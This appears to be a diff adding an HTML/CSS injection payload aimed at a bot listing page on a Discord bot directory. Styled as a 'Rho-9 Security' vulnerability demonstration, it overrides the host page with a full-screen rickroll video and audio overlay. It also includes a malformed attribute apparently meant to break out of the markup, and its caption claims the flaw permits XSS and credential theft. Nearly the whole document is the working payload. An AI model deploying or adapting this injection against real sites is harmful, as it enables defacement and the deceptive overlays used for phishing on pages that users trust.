@@ -1,0 +1,289 @@
+<html>
+<head>
+	<style>
+        html, body {
+            margin: 0 !important;
+            padding: 0 !important;
+            background: #000 !important;
+            color: #fff !important;
+            height: 100vh !important;
+            width: 100vw !important;
+            overflow: hidden !important;
+            font-family: Arial, sans-serif !important;
+        }
+
+        * {
+            box-sizing: border-box !important;
+        }
+
+        .fullscreen-container {
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100vw !important;
+            height: 100vh !important;
+            display: flex !important;
+            flex-direction: column !important;
+            justify-content: center !important;
+            align-items: center !important;
+            background: #000 !important;
+            z-index: 2147483647 !important;
+        }
+
+        .video-container {
+            position: absolute !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100% !important;
+            height: 100% !important;
+            z-index: 2147483640 !important;
+        }
+
+        .fullscreen-video {
+            width: 100% !important;
+            height: 100% !important;
+            object-fit: cover !important;
+            position: absolute !important;
+            top: 0 !important;
+            left: 0 !important;
+        }
+
+        .header-overlay {
+            position: absolute !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100% !important;
+            padding: 40px !important;
+            background: rgba(0,0,0,0.7) !important;
+            z-index: 2147483645 !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            flex-direction: column !important;
+        }
+
+        .logo-container {
+            display: flex !important;
+            align-items: center !important;
+            margin-bottom: 25px !important;
+            padding: 10px !important;
+        }
+
+        .logo {
+            width: 200px !important;
+            height: 100px !important;
+            margin-right: 30px !important;
+            border-radius: 10px !important;
+            border: 2px solid #3498db !important;
+            object-fit: contain !important;
+        }
+
+        .security-title {
+            font-size: 48px !important;
+            margin: 0 0 20px 0 !important;
+            color: #3498db !important;
+            text-shadow: 0 0 10px rgba(52, 152, 219, 0.8) !important;
+            letter-spacing: 1px !important;
+        }
+
+        .security-subtitle {
+            font-size: 30px !important;
+            margin: 15px 0 !important;
+            color: #f1c40f !important;
+            letter-spacing: 0.5px !important;
+        }
+
+        .footer-overlay {
+            position: absolute !important;
+            bottom: 0 !important;
+            left: 0 !important;
+            width: 100% !important;
+            padding: 20px !important;
+            background: rgba(0,0,0,0.7) !important;
+            z-index: 2147483645 !important;
+        }
+
+        .security-caption {
+            max-width: 800px !important;
+            margin: 0 auto !important;
+            line-height: 1.6 !important;
+            font-size: 18px !important;
+        }
+
+        /* Hidden audio player */
+        .hidden-audio {
+            opacity: 0.1 !important;
+            position: fixed !important;
+            bottom: 10px !important;
+            right: 10px !important;
+            z-index: 2147483646 !important;
+        }
+
+        /* Play button styling */
+        .play-button-container {
+            position: fixed !important;
+            top: 50% !important;
+            left: 50% !important;
+            transform: translate(-50%, -50%) !important;
+            z-index: 2147483646 !important;
+            display: flex !important;
+            justify-content: center !important;
+            align-items: center !important;
+        }
+
+        /* CSS-only button with text overlay hack */
+        .play-button {
+            display: block !important;
+            width: 300px !important;
+            height: 80px !important;
+            background: #3498db !important;
+            color: white !important;
+            border: none !important;
+            border-radius: 10px !important;
+            box-shadow: 0 0 20px rgba(52, 152, 219, 0.8) !important;
+            position: relative !important;
+            text-align: center !important;
+            font-size: 24px !important;
+            font-weight: bold !important;
+            line-height: 80px !important;
+            text-decoration: none !important;
+            cursor: pointer !important;
+        }
+
+        .play-button:hover {
+            background: #2980b9 !important;
+            box-shadow: 0 0 30px rgba(52, 152, 219, 1) !important;
+        }
+
+        /* Create a CSS-only media player control hack */
+        #play-control {
+            display: none !important;
+        }
+
+        /* When checkbox is checked, try to hide the button */
+        #play-control:checked ~ .play-button-container {
+            opacity: 0 !important;
+            pointer-events: none !important;
+        }
+
+        /* Optional: attempt to enable audio when the checkbox is checked */
+        #play-control:checked ~ .hidden-audio {
+            opacity: 0.5 !important;
+        }
+	</style>
+</head>
+<body>
+
+<input type="checkbox" id="play-control" />
+
+
+<div class="play-button-container">
+	<label class="play-button">Start Security Demonstration</label>
+</div>
+
+
+<audio class="hidden-audio" controls>
+	<source src="https://ia902305.us.archive.org/25/items/never-gonna-give-you-up-rick-astley/Never%20Gonna%20Give%20You%20Up%20-%20Rick%20Astley.mp3" type="audio/mp3"></source>
+	<source src="https://ia902305.us.archive.org/25/items/never-gonna-give-you-up-rick-astley/Never%20Gonna%20Give%20You%20Up%20-%20Rick%20Astley.mp3" type="audio/mpeg"></source>
+</audio>
+
+<div class="fullscreen-container">
+
+	<div class="video-container">
+		<video class="fullscreen-video" controls>
+			<source src="https://ia802905.us.archive.org/33/items/rick-astley-never-gonna-give-you-up-video/Rick%20Astley%20-%20Never%20Gonna%20Give%20You%20Up%20%28Video%29.mp4" type="video/mp4"></source>
+		</video>
+	</div>
+
+
+	<div class="header-overlay">
+		<div class="logo-container">
+			<img src="https://i.imgur.com/TXykydS.png" alt="Rho-9 Security Logo" class="logo" />
+			<h1 class="security-title">Rho-9 Security</h1>
+		</div>
+		<h2 class="security-subtitle">Security Vulnerability Demonstration</h2>
+	</div>
+
+
+	<div class="footer-overlay">
+		<p class="security-caption">
+			This demonstration shows that the Discord Extreme List website has a vulnerability
+			in its iframe sandbox that allows injected content to override page appearance and play media.
+			A malicious actor could use this vulnerability to execute Cross-Site Scripting (XSS) attacks,
+			potentially leading to session hijacking or credential theft.
+		</p>
+	</div>
+</div>
+</body>
+</html>
+
+
+
+
+
+<style>
+    #bot-custom-1092473933711810570 {
+        font-family: 'Arial', sans-serif;
+        background-color: #1a1a1a; /* Dark background color */
+        color: #ff9900; /* Bright and eye-catching text color */
+        margin: 20px;
+    }
+
+    #bot-custom-1092473933711810570 h1 {
+        color: #00bfff; /* Light blue heading color */
+        border-bottom: 2px solid #00bfff;
+        padding-bottom: 5px;
+        margin-bottom: 20px;
+    }
+
+    #bot-custom-1092473933711810570 p {
+        line-height: 1.6;
+        margin-bottom: 15px;
+    }
+
+    #bot-custom-1092473933711810570 code {
+        background-color: #333; /* Dark background color for code */
+        padding: 2px 5px;
+        border-radius: 4px;
+        font-family: 'Courier New', monospace;
+        color: #00bfff; /* Light blue text color for code */
+    }
+
+    #bot-custom-1092473933711810570 .highlight {
+        background-color: #555; /* Darker background color for highlight */
+        color: #ffcc00; /* Yellow text color for highlight */
+        padding: 10px;
+        border-radius: 5px;
+        margin: 15px 0;
+    }
+
+    #bot-custom-1092473933711810570 iframe {
+        width: 100%;
+        height: 400px;
+        border: none;
+        margin-top: 20px;
+    }
+
+    #bot-custom-1092473933711810570 iframe.text-content {
+        width: 100%;
+        height: 300px;
+        border: none;
+        margin-top: 20px;
+    }
+</style>
+<div id="></source>
+    <h1>Introducing Rho-9: Your Discord Security Solution</h1>
+
+    <p>Rho-9 is dedicated to ensuring the safety of Discord users worldwide by keeping malicious individuals at bay. Our robust protection includes treating all <code>.exe</code> files as potential threats and utilizing a comprehensive database to block known malicious links.</p>
+
+    <p>To help us keep everyone safe, Rho-9 features report functions for reporting malicious users.</p>
+
+    <p>Worried about known malicious users in your server? Simply run the ">check_security" command to scan your server and automatically ban any detected blacklisted users.<p></p>
+
+	<p>Trust Rho-9 for effective and professional malware defense for your server.</p>
+
+	<div class="highlight">Visit our website for more information: <a href="https://rho-9.com/" target="_blank" style="color:#ffcc00">Rho-9 Information</a></div>
+
+	<iframe src="https://rho-9.com/" sandbox="allow-forms"></iframe>
+</div>
+
